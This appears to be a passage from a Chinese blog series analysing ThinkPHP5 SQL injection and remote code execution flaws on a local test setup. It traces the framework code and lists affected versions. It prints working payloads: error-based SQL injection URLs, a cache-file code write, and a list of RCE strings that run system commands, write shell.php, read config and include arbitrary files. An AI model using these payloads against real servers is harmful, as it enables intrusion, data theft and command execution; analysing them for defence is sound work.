<p><img src="https://cdnjson.com/images/2023/05/18/imagecf2e52504f14ccc7.png" alt="imagecf2e52504f14ccc7.png"><img src="https://cdnjson.com/images/2023/05/18/image7a88fbb4b9a035ea.png" alt="image7a88fbb4b9a035ea.png"></p>
<p>然后又调用了parseWhereItem方法，在这个之前和我分析的上一个漏洞都一样</p>
<p>这里由于我们的SQL操作是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>])-&gt;<span class="title function_ invoke__">select</span>();</span><br></pre></td></tr></table></figure>

<p>没有中间的条件，所以在这个else这里，返回的结果是$str</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image6064249918fb5ee7.png" alt="image6064249918fb5ee7.png"></p>
<p>这里当我们的exp为not like时</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$logic</span> = <span class="keyword">isset</span>(<span class="variable">$val</span>[<span class="number">2</span>]) ? <span class="variable">$val</span>[<span class="number">2</span>] : <span class="string">&#x27;AND&#x27;</span>;</span><br><span class="line"><span class="variable">$whereStr</span> .= <span class="string">&#x27;(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="variable">$array</span>, <span class="string">&#x27; &#x27;</span> . <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$logic</span>) . <span class="string">&#x27; &#x27;</span>) . <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$whereStr</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/image3a023dd31afa1ae2.png" alt="image3a023dd31afa1ae2.png"></p>
<p>最后$whereStr被执行，回到parseWhere方法这里</p>
<p>最后将$whereStr返回</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image981e6b4f18bf5c44.png" alt="image981e6b4f18bf5c44.png"></p>
<p>我们添加一句输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27; WHERE &#x27; . $whereStr;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/imagef58aa58e412a6616.png" alt="imagef58aa58e412a6616.png"><img src="https://cdnjson.com/images/2023/05/18/imaged0f4802f7435e45b.png" alt="imaged0f4802f7435e45b.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WHERE</span> (`username` <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">&#x27;%%&#x27;</span> ) <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,DATABASE()# `username` <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">&#x27;233&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后替换下执行</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imaged9cb2ac33268f989.png" alt="imaged9cb2ac33268f989.png"></p>
<p>在\thinkphp\base.php下的THINK_VERSION可以看到thinkphp版本，方便具体找特定版本漏洞</p>
<h4 id="ThinkPHP5漏洞分析之SQL注入-五"><a href="#ThinkPHP5漏洞分析之SQL注入-五" class="headerlink" title="ThinkPHP5漏洞分析之SQL注入(五)"></a>ThinkPHP5漏洞分析之SQL注入(五)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">漏洞影响版本： </span><br><span class="line">5.1.16&lt;=ThinkPHP5&lt;=5.1.22</span><br></pre></td></tr></table></figure>

<p>通过以下命令获取测试环境代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.22 tpdemo5</span><br></pre></td></tr></table></figure>

<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.22&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后执行 <code>composer update</code> ，并将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$orderby</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;orderby&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;mochazz&#x27;</span>])-&gt;<span class="title function_ invoke__">order</span>(<span class="variable">$orderby</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <strong>config/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>config/app.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo5/public/index.php/index/index/index?orderby[id`|extractvalue(1,concat(char(126),database()))%23]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/image3c67272ba89c702b.png" alt="image3c67272ba89c702b.png"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases?after=v5.1.7&amp;page=6">https://github.com/top-think/framework/releases?after=v5.1.7&amp;page=6</a></p>
<p><img src="https://cdnjson.com/images/2023/05/18/image9d98fb5757cbff7d.png" alt="image9d98fb5757cbff7d.png"></p>
<p>这里说改进了order方法的数组解析方式，我们去看看</p>
<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/compare/v5.1.23...5.1">https://github.com/top-think/framework/compare/v5.1.23...5.1</a></p>
<p><img src="https://cdnjson.com/images/2023/05/18/image5c0bbbe027423b13.png" alt="image5c0bbbe027423b13.png"></p>
<p>首先，我们直接查看request类下的input方法，这里调用了array_walk_recursive方法，这个函数的作用是数组遍历函数，用于对多维数组中的每个元素应用回调函数，没有对安全性有过滤</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image72084bf731e71cb8.png" alt="image72084bf731e71cb8.png"></p>
<p>然后回到thinkphp/library/think/db/Query.php下的order方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imaged223319f2c31de0e.png" alt="imaged223319f2c31de0e.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;order&#x27;</span>] = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;options[<span class="string">&#x27;order&#x27;</span>], <span class="variable">$field</span>);</span><br></pre></td></tr></table></figure>

<p>然后我们查看find方法，这里调用了在 <strong>Connection</strong> 类下的find方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imagef63346bcb855b28f.png" alt="imagef63346bcb855b28f.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/18/image2953040f10f608ea.png" alt="image2953040f10f608ea.png"></p>
<p>在这个方法中调用了builder.php类下的select方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image0c89852c497ea1ce.png" alt="image0c89852c497ea1ce.png"></p>
<p>这里我们主要关心这个parseOrder方法的替换</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imageb5cd23c395a6d554.png" alt="imageb5cd23c395a6d554.png"></p>
<p>方法内部又调用了parseKey方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image4da4f542e81b84d7.png" alt="image4da4f542e81b84d7.png"></p>
<p>但是无关紧要，最后返回的是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="string">&#x27; ORDER BY &#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$array</span>);</span><br><span class="line"><span class="comment">// `id`|extractvalue(1,concat(char(126),database()))#`</span></span><br><span class="line"><span class="comment">// select extractvalue(1,concat(char(126),database()));</span></span><br></pre></td></tr></table></figure>



<p><img src="https://cdnjson.com/images/2023/05/18/imaged5ce447de4e14e27.png" alt="imaged5ce447de4e14e27.png"></p>
<p>这里如果我们的payload是：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo5/public/index.php/index/index/index?orderby[id`|extractvalue(1,concat(char(126),database()))%23]=1</span><br></pre></td></tr></table></figure>

<p>那么走下面的输出456</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image26f1f9cb1eedd393.png" alt="image26f1f9cb1eedd393.png"></p>
<p>如果我们的payload是：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo5/public/index.php/index/index/index?orderby[0]=id`|extractvalue(1,concat(char(126),database()))%23</span><br></pre></td></tr></table></figure>

<p>则走上面的输出123</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image4a399e0badf3c537.png" alt="image4a399e0badf3c537.png"></p>
<p>但是无所谓，最后都是拼接执行了</p>
<h4 id="ThinkPHP5漏洞分析之SQL注入-六"><a href="#ThinkPHP5漏洞分析之SQL注入-六" class="headerlink" title="ThinkPHP5漏洞分析之SQL注入(六)"></a>ThinkPHP5漏洞分析之SQL注入(六)</h4><p>本次漏洞存在于所有 <strong>Mysql</strong> 聚合函数相关方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">漏洞影响版本： </span><br><span class="line">5.0.0&lt;=ThinkPHP&lt;=5.0.21 、 </span><br><span class="line">5.1.3&lt;=ThinkPHP5&lt;=5.1.25。</span><br></pre></td></tr></table></figure>

<p>不同版本 <strong>payload</strong> 需稍作调整：</p>
<p> <strong>5.0.0~5.0.21</strong> 、 <strong>5.1.3～5.1.10</strong> ： <strong>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong> </p>
<p> <strong>5.1.11～5.1.25</strong> ： <strong>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong> </p>
<p>通过以下命令获取测试环境代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.25 tpdemo</span><br></pre></td></tr></table></figure>

<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.25&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>然后执行 <code>composer update</code> ，并将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$options</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">max</span>(<span class="variable">$options</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <strong>config/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>config/app.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo5/public/index.php/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/image1cb37b766379aa57.png" alt="image1cb37b766379aa57.png"></p>
<p>query.php</p>
<p>调用了max方法下的aggregate方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imagec487fde2506e05dc.png" alt="imagec487fde2506e05dc.png"></p>
<p>这个aggregate方法内部又调用了collection类下的aggregate方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image128b20d342848ee4.png" alt="image128b20d342848ee4.png"></p>
<p>该方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image57b27834d87449d5.png" alt="image57b27834d87449d5.png"></p>
<p>我们的payload是：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo5/public/index.php/index/index/index?options=id`)%2bextractvalue(1,concat(char(126),database())) from users%23</span><br></pre></td></tr></table></figure>

<p>对$field的输出是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAX(`id`)+extractvalue(1,concat(char(126),database())) from users#`) AS tp_max </span><br></pre></td></tr></table></figure>

<p>执行起来就是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">MAX</span>(`id`)<span class="operator">+</span>extractvalue(<span class="number">1</span>,concat(<span class="type">char</span>(<span class="number">126</span>),database())) <span class="keyword">from</span> users#`) <span class="keyword">AS</span> tp_max;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们输入的是：id`)+extractvalue(1,concat(char(126),database())) from users#</span><br></pre></td></tr></table></figure>

<p>缺点是你必须知道某个表下的某个字段，比如users表下的id</p>
<p>这里我们的调用了buildermysql.php下的parseKey方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image6d10e2053261c113.png" alt="image6d10e2053261c113.png"></p>
<p>。</p>
<h3 id="ThinkPHP5-代码执行篇"><a href="#ThinkPHP5-代码执行篇" class="headerlink" title="ThinkPHP5-代码执行篇"></a>ThinkPHP5-代码执行篇</h3><h4 id="ThinkPHP5漏洞分析之代码执行（一）"><a href="#ThinkPHP5漏洞分析之代码执行（一）" class="headerlink" title="ThinkPHP5漏洞分析之代码执行（一）"></a>ThinkPHP5漏洞分析之代码执行（一）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">漏洞影响版本： </span><br><span class="line">5.0.0&lt;=ThinkPHP5&lt;=5.0.10</span><br></pre></td></tr></table></figure>

<p>通过以下命令获取测试环境代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.10 tpdemo</span><br></pre></td></tr></table></figure>

<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>然后执行 <code>composer update</code> ，并将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">Cache</span>::<span class="title function_ invoke__">set</span>(<span class="string">&quot;name&quot;</span>,<span class="title function_ invoke__">input</span>(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将username写入缓存，但是无法被访问到</p>
<p><a target="_blank" rel="noopener" href="http://localhost/thinkphpvul/tpdemo4/public/?username=mochazz123%0D%0Aphpinfo();//!%5Bimage796d1f70fedf1505.png%5D(https://cdnjson.com/images/2023/05/18/image796d1f70fedf1505.png)">http://localhost/thinkphpvul/tpdemo4/public/?username=mochazz123%0d%0aphpinfo();//![image796d1f70fedf1505.png](https://cdnjson.com/images/2023/05/18/image796d1f70fedf1505.png)</a></p>
<p>但是问题是我们不知道缓存的文件名</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image67f80b1b703ace55.png" alt="image67f80b1b703ace55.png"></p>
<p>跟到cache.php中的set方法</p>
<p>这里又通过单例模式 <strong>init</strong> 方法，创建了一个类实例</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image9a1d52b02af188c3.png" alt="image9a1d52b02af188c3.png"></p>
<p>这里的self::$handler是</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image86aa886ecbad8bf5.png" alt="image86aa886ecbad8bf5.png"></p>
<p>该类由 <strong>cache</strong> 的配置项 <strong>type</strong> 决定，默认情况下其值为 <strong>File</strong></p>
<p><img src="https://cdnjson.com/images/2023/05/18/imagec6a32324e9b0ec9b.png" alt="imagec6a32324e9b0ec9b.png"></p>
<p><strong>self::$handler</strong> 即为 <strong>think\cache\driver\File</strong> 类实例</p>
<p>这里$data没有经过什么过滤就写入了</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image9e04c7750de7e344.png" alt="image9e04c7750de7e344.png"></p>
<p>这里的$filename = $this-&gt;getCacheKey($name);</p>
<p>我们查看getCacheKey方法是如何定义文件名的</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image39c579e8c2e7f4d5.png" alt="image39c579e8c2e7f4d5.png"></p>
<p>我们这里的缓存变量名$name = “name”;</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image7389ba7f9a6ec4f2.png" alt="image7389ba7f9a6ec4f2.png"></p>
<p>这里就是取name的md5值的前两位作为目录名，2位之后的所有作为文件名</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imagea5b001341216930d.png" alt="imagea5b001341216930d.png"></p>
<p>如图，name的md5是b068931cc450442b63f5b3d276ea4297</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image192d9615b654d22c.png" alt="image192d9615b654d22c.png"></p>
<p>那么就是b0/68931cc450442b63f5b3d276ea4297.php</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image6e21f5f5a75ae9c8.png" alt="image6e21f5f5a75ae9c8.png"></p>
<p>所以如果想利用成功的前提是知道这个name，而且当项目部署在web上时，只有public目录可以对外访问，而runtime目录不可以，所以这个洞有点鸡肋。</p>
<h4 id="ThinkPHP5漏洞分析之代码执行（二）"><a href="#ThinkPHP5漏洞分析之代码执行（二）" class="headerlink" title="ThinkPHP5漏洞分析之代码执行（二）"></a>ThinkPHP5漏洞分析之代码执行（二）</h4><p>本次漏洞存在于 <strong>ThinkPHP</strong> 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 <strong>远程代码执行漏洞</strong> 的产生。漏洞影响版本： <strong>5.0.7&lt;=ThinkPHP5&lt;=5.0.22</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong>。不同版本 <strong>payload</strong> 需稍作调整：</p>
<p><strong>5.1.x</strong> ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd</span><br><span class="line">?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;</span><br><span class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;</span><br><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>

<p><strong>5.0.x</strong> ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\config/get&amp;name=database.username # 获取配置信息</span><br><span class="line">?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件</span><br><span class="line">?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>

<p>例如</p>
<p>命令执行</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo4/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/image358f4d17de8a30e9.png" alt="image358f4d17de8a30e9.png"></p>
<p>代码执行</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo4/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/image80970fbdbe8a161b.png" alt="image80970fbdbe8a161b.png"></p>
<p>可以通过以下命令获取测试环境代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think tpdemo</span><br></pre></td></tr></table></figure>

<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.30&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>然后执行 <code>composer update</code> </p>
<p>默认情况下安装的 <strong>ThinkPHP</strong> 是没有开启强制路由选项，而且默认开启路由兼容模式。</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imagec34cf46ffb56d3e0.png" alt="imagec34cf46ffb56d3e0.png"></p>
<p>在没有开启强制路由，说明我们可以使用路由兼容模式 <strong>s</strong> 参数，而框架对控制器名没有进行足够的检测，说明可能可以调用任意的控制器，那么我们可以试着利用 <strong><a target="_blank" rel="noopener" href="http://site/?s=%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%96%B9%E6%B3%95">http://site/?s=模块/控制器/方法</a></strong> 来测试一下。</p>
<p>当我们输入这个代码执行</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo4/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>

<p>会被ThinkPHP解析为对<code>\think\app\invokefunction()</code>函数的调用，该函数会执行一个用户指定的回调函数，并传递相应的参数。具体来说，上述URL地址调用的过程如下：</p>
<ol>
<li>在应用程序入口文件<code>public/index.php</code>中，读取$s参数的值，发现它等于<code>&#39;index/\think\app\invokefunction&#39;</code>。</li>
<li>根据$s参数的值，路由到<code>\think\route\Route::check()</code>方法，并将其解析为一个控制器调用。</li>
<li><code>\think\route\Route::check()</code>方法继续将控制器路径解析为<code>\think\app\invokefunction()</code>函数的调用，并将剩余的参数作为回调函数的参数。</li>
<li>最终，<code>\think\app\invokefunction()</code>函数调用了用户指定的回调函数<code>call_user_func_array()</code>，并将其传递的参数作为回调函数的参数。</li>
</ol>
<p>在函数内部，首先使用ReflectionFunction类创建一个反射对象reflect，用于获取function函数的相关信息，然后，使用bindParams()方法根据反射对象和参数数组来绑定参数，生成一个包含所有参数值的数组args</p>
<p>并使用反射对象的‘invokeArgs()‘方法调用function函数，并将$args作为实参传递进去，返回函数执行结果</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image8f738df215263fee.png" alt="image8f738df215263fee.png"></p>
<p>这个就是经典的利用反射来调用任意命令执行的函数，并传入参数值实现rce</p>
